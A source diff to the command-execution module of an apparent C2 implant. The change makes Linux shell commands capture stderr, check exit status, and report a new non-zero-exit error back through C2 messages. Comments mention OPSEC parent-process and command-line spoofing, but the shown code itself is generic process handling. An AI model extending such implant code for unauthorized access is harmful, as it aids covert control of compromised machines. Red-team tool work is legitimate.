@@ -4,6 +4,9 @@
 #include <array>
 #include <thread>
 #include <future>
+#ifdef __linux__
+#include <sys/wait.h>
+#endif
 
 #include "Common.hpp"
 
@@ -112,6 +115,7 @@ int Run::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #define ERROR_PROCESS_START_FAIL 1 
 #define ERROR_WINDOWS 2
+#define ERROR_PROCESS_EXIT_FAIL 3
 
 // OPSEC parent process spoofing
 // OPSEC Command line argument spoofing
@@ -140,16 +144,19 @@ int Run::execBash(const std::string& cmd, std::string& result)
 
 #ifdef __linux__ 
 
-    std::array<char, 128> buffer;
-    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
+    std::array<char, 4096> buffer;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen((cmd + " 2>&1").c_str(), "r"), pclose);
     if (!pipe)
     {
         return ERROR_PROCESS_START_FAIL;
     }
-    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
-    {
-        result += buffer.data();
-    }
+    std::size_t bytesRead = 0;
+    while ((bytesRead = fread(buffer.data(), 1, buffer.size(), pipe.get())) != 0)
+        result.append(buffer.data(), bytesRead);
+    const bool readFailed = ferror(pipe.get()) != 0;
+    const int status = pclose(pipe.release());
+    if (readFailed || status == -1 || !WIFEXITED(status) || WEXITSTATUS(status) != 0)
+        return ERROR_PROCESS_EXIT_FAIL;
 
 #elif _WIN32
 
@@ -301,6 +308,12 @@ int Run::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
         {
             case ERROR_PROCESS_START_FAIL:
                 errorMsg = "Process failed to start.";
+                break;
+
+            case ERROR_PROCESS_EXIT_FAIL:
+                errorMsg = "Process exited with a non-zero status.";
+                if (!c2RetMessage.returnvalue().empty())
+                    errorMsg += "\n" + c2RetMessage.returnvalue();
                 break;
 
             default:
